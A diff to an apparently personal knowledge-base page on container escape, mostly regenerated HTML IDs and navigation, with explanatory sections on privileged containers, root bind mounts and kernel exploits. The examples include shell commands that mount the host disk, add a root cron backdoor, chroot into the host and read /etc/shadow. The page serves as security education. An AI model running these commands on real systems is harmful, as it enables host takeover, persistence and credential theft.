@@ -3,11 +3,11 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2026-07-20 Mon 15:55 -->
+<!-- 2026-07-30 Thu 22:14 -->
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Container escape</title>
-<meta name="author" content="termux" />
+<meta name="author" content="Gregory Hugaerts" />
 <meta name="generator" content="Org Mode" />
 <link rel="stylesheet" href="style.css" type="text/css"/>
 <style type='text/css'>
@@ -860,6 +860,24 @@ pre {
 </head>
 <body>
 <div id="preamble" class="status">
+<div id='generated-header' class='generated'><header>
+ <nav>
+<a class='nav-title'href='/index.html' >
+Gregory Hugaerts
+</a>
+<input id='nav-toggle-top' class='nav-toggle' type='checkbox'>
+<label class='nav-button' for='nav-toggle-top'><span/></label>
+<div class='separator menu-sep'></div>
+<ul class='nav-list'>
+<li class='nav-item'>
+<a class='nav-link' href='/index.html'>
+Knowledge Base</a>
+</li>
+</ul>
+<div class='separator'></div>
+</nav>
+</header>
+</div>
 <div id='view-controls'><div id='toggle-mode' title='Mode'>&#9788;</div><div id='goto-top' title='Top'>&#8963;</div><div id='toggle-toc' title='Contents'>&#9776;</div></div>
 </div>
 <div id="content" class="content">
@@ -868,19 +886,19 @@ pre {
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#orge66ad0e">Container Escape</a>
+<li><a href="#orgdc5b231">Container Escape</a>
 <ul>
-<li><a href="#org1fbf90d">Description</a>
+<li><a href="#orgb7b9bee">Description</a>
 <ul>
-<li><a href="#orge3c41d3">Attack Vectors</a></li>
-<li><a href="#org5730fa8">Impact</a></li>
+<li><a href="#org393d72f">Attack Vectors</a></li>
+<li><a href="#org38e65d5">Impact</a></li>
 </ul>
 </li>
-<li><a href="#org00d134f">Examples</a>
+<li><a href="#org3f4571b">Examples</a>
 <ul>
-<li><a href="#org003db79">. Exploiting Privileged Containers</a></li>
-<li><a href="#orgff754ba">2. Exploiting Insecure Volume Mounts</a></li>
-<li><a href="#org97aff28">3. Leveraging Kernel Vulnerabilities</a></li>
+<li><a href="#org720c0aa">. Exploiting Privileged Containers</a></li>
+<li><a href="#org1625b19">2. Exploiting Insecure Volume Mounts</a></li>
+<li><a href="#org5333c36">3. Leveraging Kernel Vulnerabilities</a></li>
 </ul>
 </li>
 </ul>
@@ -888,13 +906,13 @@ pre {
 </ul>
 </div>
 </div>
-<div id="outline-container-orge66ad0e" class="outline-2">
-<h2 id="orge66ad0e">Container Escape</h2>
-<div class="outline-text-2" id="text-orge66ad0e">
+<div id="outline-container-orgdc5b231" class="outline-2">
+<h2 id="orgdc5b231">Container Escape</h2>
+<div class="outline-text-2" id="text-orgdc5b231">
 </div>
-<div id="outline-container-org1fbf90d" class="outline-3">
-<h3 id="org1fbf90d">Description</h3>
-<div class="outline-text-3" id="text-org1fbf90d">
+<div id="outline-container-orgb7b9bee" class="outline-3">
+<h3 id="orgb7b9bee">Description</h3>
+<div class="outline-text-3" id="text-orgb7b9bee">
 <p>
 Containerization is a technology that isolates applications by running them in lightweight, virtualized environments called containers. These containers rely on the host's operating system kernel (e.g., Linux kernel) but use features like <b>namespaces</b> and <b>cgroups</b> to provide strong, but not absolute, isolation.
 </p>
@@ -903,9 +921,9 @@ Containerization is a technology that isolates applications by running them in l
 A container escape is a successful <b>Privilege Escalation</b> attack that moves the attacker from the restricted, sandboxed environment of the container to the privileged, shared environment of the host machine.
 </p>
 </div>
-<div id="outline-container-orge3c41d3" class="outline-4">
-<h4 id="orge3c41d3">Attack Vectors</h4>
-<div class="outline-text-4" id="text-orge3c41d3">
+<div id="outline-container-org393d72f" class="outline-4">
+<h4 id="org393d72f">Attack Vectors</h4>
+<div class="outline-text-4" id="text-org393d72f">
 <p>
 Container escapes typically succeed due to one of three main categories of security misconfiguration or flaw:
 </p>
@@ -922,9 +940,9 @@ Container escapes typically succeed due to one of three main categories of secur
 </ol>
 </div>
 </div>
-<div id="outline-container-org5730fa8" class="outline-4">
-<h4 id="org5730fa8">Impact</h4>
-<div class="outline-text-4" id="text-org5730fa8">
+<div id="outline-container-org38e65d5" class="outline-4">
+<h4 id="org38e65d5">Impact</h4>
+<div class="outline-text-4" id="text-org38e65d5">
 <p>
 A successful container escape grants the attacker control over the host machine, leading to the compromise of all other containers running on that host, data theft, and the installation of persistence mechanisms.
 </p>
@@ -933,13 +951,13 @@ A successful container escape grants the attacker control over the host machine,
 </div>
 </div>
 </div>
-<div id="outline-container-org00d134f" class="outline-3">
-<h3 id="org00d134f">Examples</h3>
-<div class="outline-text-3" id="text-org00d134f">
+<div id="outline-container-org3f4571b" class="outline-3">
+<h3 id="org3f4571b">Examples</h3>
+<div class="outline-text-3" id="text-org3f4571b">
 </div>
-<div id="outline-container-org003db79" class="outline-4">
-<h4 id="org003db79">. Exploiting Privileged Containers</h4>
-<div class="outline-text-4" id="text-org003db79">
+<div id="outline-container-org720c0aa" class="outline-4">
+<h4 id="org720c0aa">. Exploiting Privileged Containers</h4>
+<div class="outline-text-4" id="text-org720c0aa">
 <p>
 If a Docker container is started with the <code>--privileged</code> flag, an attacker can exploit this by mounting the host's disk.
 </p>
@@ -949,11 +967,11 @@ If a Docker container is started with the <code>--privileged</code> flag, an att
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SH</span><button class='copyBtn' name=btn_0b48ef1953094ff586e5956f98fa1a56>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SH</span><button class='copyBtn' name=btn_c37c1f4fa2004ef38a5ac33f1779b107>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_0b48ef1953094ff586e5956f98fa1a56=document.querySelector('button[name=btn_0b48ef1953094ff586e5956f98fa1a56]');
-copyBtnbtn_0b48ef1953094ff586e5956f98fa1a56.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`docker run -it --privileged ubuntu bash\n`);copyBtnbtn_0b48ef1953094ff586e5956f98fa1a56.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_0b48ef1953094ff586e5956f98fa1a56.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_c37c1f4fa2004ef38a5ac33f1779b107=document.querySelector('button[name=btn_c37c1f4fa2004ef38a5ac33f1779b107]');
+copyBtnbtn_c37c1f4fa2004ef38a5ac33f1779b107.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`docker run -it --privileged ubuntu bash\n`);copyBtnbtn_c37c1f4fa2004ef38a5ac33f1779b107.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_c37c1f4fa2004ef38a5ac33f1779b107.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -966,11 +984,11 @@ let res = copyTextToClipboard(`docker run -it --privileged ubuntu bash\n`);copyB
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SH</span><button class='copyBtn' name=btn_11c7976d9f2a4c94a2b88e3fef0a3193>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SH</span><button class='copyBtn' name=btn_d21718d3b2b447b7aefb62c3f03b0afd>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_11c7976d9f2a4c94a2b88e3fef0a3193=document.querySelector('button[name=btn_11c7976d9f2a4c94a2b88e3fef0a3193]');
-copyBtnbtn_11c7976d9f2a4c94a2b88e3fef0a3193.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# 1. Access the host's disk device (e.g., /dev/sda1)\n# Attacker can now create a malicious file or modify system configuration on the host\nmkdir /host_root\nmount /dev/sda1 /host_root\n\n# 2. Modify the host's cron job (a persistence mechanism)\necho '* * * * * root bash /tmp/backdoor.sh' >> /host_root/etc/crontab\n`);copyBtnbtn_11c7976d9f2a4c94a2b88e3fef0a3193.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_11c7976d9f2a4c94a2b88e3fef0a3193.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_d21718d3b2b447b7aefb62c3f03b0afd=document.querySelector('button[name=btn_d21718d3b2b447b7aefb62c3f03b0afd]');
+copyBtnbtn_d21718d3b2b447b7aefb62c3f03b0afd.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# 1. Access the host's disk device (e.g., /dev/sda1)\n# Attacker can now create a malicious file or modify system configuration on the host\nmkdir /host_root\nmount /dev/sda1 /host_root\n\n# 2. Modify the host's cron job (a persistence mechanism)\necho '* * * * * root bash /tmp/backdoor.sh' >> /host_root/etc/crontab\n`);copyBtnbtn_d21718d3b2b447b7aefb62c3f03b0afd.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_d21718d3b2b447b7aefb62c3f03b0afd.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -985,9 +1003,9 @@ mount /dev/sda1 /host_root
 </div></div>
 </div>
 </div>
-<div id="outline-container-orgff754ba" class="outline-4">
-<h4 id="orgff754ba">2. Exploiting Insecure Volume Mounts</h4>
-<div class="outline-text-4" id="text-orgff754ba">
+<div id="outline-container-org1625b19" class="outline-4">
+<h4 id="org1625b19">2. Exploiting Insecure Volume Mounts</h4>
+<div class="outline-text-4" id="text-org1625b19">
 <p>
 If the host's /proc filesystem is mounted, an attacker can use it to potentially write to arbitrary files on the host using its process IDs (PIDs).
 </p>
@@ -997,11 +1015,11 @@ If the host's /proc filesystem is mounted, an attacker can use it to potentially
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SH</span><button class='copyBtn' name=btn_146de61a80e94042a5659f012db631db>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SH</span><button class='copyBtn' name=btn_73af257aa09140fba1901cdbf97c2b2e>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_146de61a80e94042a5659f012db631db=document.querySelector('button[name=btn_146de61a80e94042a5659f012db631db]');
-copyBtnbtn_146de61a80e94042a5659f012db631db.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`docker run -it -v /:/host ubuntu bash\n`);copyBtnbtn_146de61a80e94042a5659f012db631db.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_146de61a80e94042a5659f012db631db.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_73af257aa09140fba1901cdbf97c2b2e=document.querySelector('button[name=btn_73af257aa09140fba1901cdbf97c2b2e]');
+copyBtnbtn_73af257aa09140fba1901cdbf97c2b2e.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`docker run -it -v /:/host ubuntu bash\n`);copyBtnbtn_73af257aa09140fba1901cdbf97c2b2e.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_73af257aa09140fba1901cdbf97c2b2e.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1014,11 +1032,11 @@ let res = copyTextToClipboard(`docker run -it -v /:/host ubuntu bash\n`);copyBtn
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SH</span><button class='copyBtn' name=btn_5429edc7c0b74252a401ad0f66496670>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SH</span><button class='copyBtn' name=btn_20919198a69f43dfbb06c0ae99eabbbc>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_5429edc7c0b74252a401ad0f66496670=document.querySelector('button[name=btn_5429edc7c0b74252a401ad0f66496670]');
-copyBtnbtn_5429edc7c0b74252a401ad0f66496670.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# 1. Change root directory to the mounted host filesystem\nchroot /host\n\n# 2. The attacker now has a root shell on the host machine.\n# They can read /etc/shadow or execute commands.\ncat /etc/shadow\n`);copyBtnbtn_5429edc7c0b74252a401ad0f66496670.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_5429edc7c0b74252a401ad0f66496670.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_20919198a69f43dfbb06c0ae99eabbbc=document.querySelector('button[name=btn_20919198a69f43dfbb06c0ae99eabbbc]');
+copyBtnbtn_20919198a69f43dfbb06c0ae99eabbbc.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# 1. Change root directory to the mounted host filesystem\nchroot /host\n\n# 2. The attacker now has a root shell on the host machine.\n# They can read /etc/shadow or execute commands.\ncat /etc/shadow\n`);copyBtnbtn_20919198a69f43dfbb06c0ae99eabbbc.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_20919198a69f43dfbb06c0ae99eabbbc.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1032,9 +1050,9 @@ let res = copyTextToClipboard(`# 1. Change root directory to the mounted host fi
 </div></div>
 </div>
 </div>
-<div id="outline-container-org97aff28" class="outline-4">
-<h4 id="org97aff28">3. Leveraging Kernel Vulnerabilities</h4>
-<div class="outline-text-4" id="text-org97aff28">
+<div id="outline-container-org5333c36" class="outline-4">
+<h4 id="org5333c36">3. Leveraging Kernel Vulnerabilities</h4>
+<div class="outline-text-4" id="text-org5333c36">
 <p>
 An attacker identifies the host kernel version using uname -a inside the container and finds a corresponding Local Privilege Escalation (LPE) exploit from Exploit-DB (e.g., a buffer overflow in a kernel module).
 </p>
@@ -1048,6 +1066,20 @@ An attacker identifies the host kernel version using uname -a inside the contain
 </div>
 </div>
 <div id="postamble" class="status">
+<div id='generated-footer' class='generated'><footer>
+ <nav>
+<div class='separator'></div>
+<a class='nav-author'href='https://gregoryhugaerts.github.io' >
+gregoryhugaerts.github.io
+</a>
+<input id='nav-toggle-bot' class='nav-toggle' type='checkbox'>
+<label class='nav-button' for='nav-toggle-bot'><span/></label>
+<div class='separator menu-sep'></div>
+<ul class='nav-list'>
+</ul>
+</nav>
+</footer>
+</div>
 <script type="text/javascript">
 <!--/*--><![CDATA[/*><!--*/
 if (!document.cookie.split('; ').find(r => r.startsWith('mode'))) {
@@ -1055,6 +1087,7 @@ document.cookie = 'mode=dark'
 }
 document.cookie = 'light=modus-operandi-tinted'
 document.cookie = 'dark=modus-vivendi-tinted'
+document.cookie = 'options=collapsing:t__src-lang:t';
 /*
 ;; nice-org-html.js
 ;;==============================================================================
